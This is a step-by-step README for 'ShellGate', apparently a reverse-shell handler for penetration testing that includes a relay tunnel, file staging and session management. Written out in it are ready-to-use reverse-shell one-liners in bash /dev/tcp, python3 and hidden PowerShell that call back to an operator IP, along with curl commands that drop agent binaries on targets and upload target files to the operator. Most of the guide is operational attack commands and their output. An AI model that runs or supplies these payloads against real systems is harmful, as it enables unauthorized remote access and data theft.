# ShellGate Step-by-Step Walkthrough

Complete operational guide for running **ShellGate v2.0.0** in authorized lab and assessment environments.

---

## Prerequisites

Before starting, verify these minimum requirements on your operator machine:

1. **Python 3.10+** (`python3 --version`) — stdlib only, zero external packages.
2. **For `--mode local` (VPN / LAN):** Active interface (`tun0`, `eth0`, etc.) and `iproute2` (`ip` CLI) on Linux.
3. **For `--mode pinggy` (NAT Traversal):**
   - OpenSSH client (`ssh -V`) in `PATH`
   - Outbound TCP port `443` allowed to `free.pinggy.io`
   - Target allowed to make outbound TCP connections to Pinggy's assigned dynamic port (e.g., `40317`)
4. **Target utilities for file transfer:** `base64` (+ `sha256sum`/`shasum` optional) on POSIX, or `certutil` + `powershell` on Windows.

---

## Step 1: Prepare the Staging Directory (Optional)

If you plan to serve diagnostic scripts or agent binaries over HTTP, place them in a dedicated staging directory:

```bash
mkdir -p ~/srv
cp /home/z0ke/Pentest-Tools/05-Post-Exploitation/Lateral-Movement/ligolo/agents/lin_agent ~/srv/
```

---

## Step 2: Start the ShellGate Listener

Choose the endpoint mode that matches your network topology:

- **Option A — Local / VPN Interface (`tun0`, `eth0`, etc.) with HTTP Staging:**
  ```bash
  shellgate --mode local --iface tun0 --port 8888 --http-port 8080 --srv-dir ~/srv
  ```
- **Option B — External Tunnel via Pinggy SSH Relay (No Port Forwarding Needed):**
  ```bash
  # Bind on 127.0.0.1 locally and expose through free.pinggy.io:443
  shellgate --mode pinggy --bind 127.0.0.1 --port 8888
  ```

Expected console banner (`local` mode vs `pinggy` mode):
```text
# Option A (local):
--- SHELLGATE v2.0.0 (LOCAL) ---
[Listener]: 0.0.0.0:8888 | [Endpoint]: tcp://10.10.14.5:8888 | [Sessions]: 0
[HTTP Staging]: http://10.10.14.5:8080 -> ./srv
1. Payloads
2. Sessions
3. Exit

# Option B (pinggy):
--- SHELLGATE v2.0.0 (PINGGY) ---
[Listener]: 127.0.0.1:8888 | [Endpoint]: tcp://fptsf-1-47-78-113.run.pinggy-free.link:40317 | [Sessions]: 0
1. Payloads
2. Sessions
3. Exit
```

> **Pinggy Tip:** Free Pinggy tunnels forward a single TCP port for up to 60 minutes. When using `--mode pinggy`, rely on ShellGate's built-in `:upload` and `:download` commands over the active socket instead of `--http-port`.

---

## Step 3: Generate Connection Snippets & Connect Target

Enter `1` at the main menu to print endpoint-bound connection commands:

```text
> 1

=== PAYLOADS (10.10.14.5:8888) ===

[bash_tcp]
bash -c 'bash -i >& /dev/tcp/10.10.14.5/8888 0>&1'

[python3]
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",8888));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'

[powershell_b64]
powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ...
```

When a client connects, ShellGate runs split-marker OS/user/host fingerprinting automatically:

```text
[+] Session connected: #1 [LINUX] www-data@target-box (10.129.10.22:49152)
```

---

## Step 4: Interact & Stabilize the Session

Enter `2` and select the Session ID:

```text
> 2
  #1 [LINUX] www-data@target-box (10.129.10.22:49152)
Session ID: 1
================================================================
[*] Interactive #1 [LINUX] www-data@target-box (10.129.10.22:49152)
[*] Type :help for commands | :back to return
================================================================
```

Useful interactive session commands:

| Command | Action |
| :--- | :--- |
| `:check` | Run quick host triage (`id; uname -a; ip -brief a` or `whoami & hostname & ipconfig`) |
| `:pty` | Upgrade POSIX session with Python 3 / `script` PTY and `TERM=xterm-256color` |
| `:rename <alias>` | Assign a friendly label to the session |
| `:info` | Show session metadata and connection timestamp |

---

## Step 5: Integrity-Verified File Transfers

1. **Upload from Operator Host to Target (chunked Base64 + remote SHA-256 check):**
   ```text
   :upload ~/srv/lin_agent /tmp/lin_agent
   [*] Uploading chunk 7087/7087
   [+] Uploaded 7086264 bytes (SHA-256 verified: 9a3f1c2e8b4d...)
   ```
   *(For large binaries when `--http-port` is active, HTTP fetch is faster: `curl -fsSL http://10.10.14.5:8080/lin_agent -o /tmp/lin_agent && chmod +x /tmp/lin_agent`)*

2. **Download from Target to Operator Host (framed Base64 + local SHA-256):**
   ```text
   :download /etc/os-release ./artifacts/os-release.txt
   [*] Received 412 bytes...
   [+] Saved ./artifacts/os-release.txt (386 bytes, SHA-256: 8c12ab9f4e21...)
   ```

3. **HTTP Upload from Target to Operator Staging (`--http-port` enabled):**
   ```bash
   curl -F "file=@/tmp/evidence.tar.gz" http://10.10.14.5:8080/upload
   # Saved safely under ~/srv/uploads/evidence.tar.gz (path traversal stripped)
   ```

4. **Return or Shutdown:**
   - `:back` returns to the main menu while keeping the session alive.
   - `:kill` closes the active session.
   - `3` on the main menu gracefully closes all sessions, listeners, HTTP staging, and Pinggy tunnels.

---

## Step 6: Publish to GitHub & Claim CEH ECE Credit (Optional)

1. Push the repository as a public tool on GitHub:
   ```bash
   cd D:\hermes_project\shellgate
   gh repo create shellgate --public --source=. --remote=origin --push
   ```
2. Verify unit tests pass before submitting:
   ```bash
   python3 -m unittest discover -s tests -v
   ```
3. Submit the public repository URL (`https://github.com/evi1sw0rd/shellgate`) in the **EC-Council Aspen Portal** under **Author Security Tool (40 ECE credits)**.
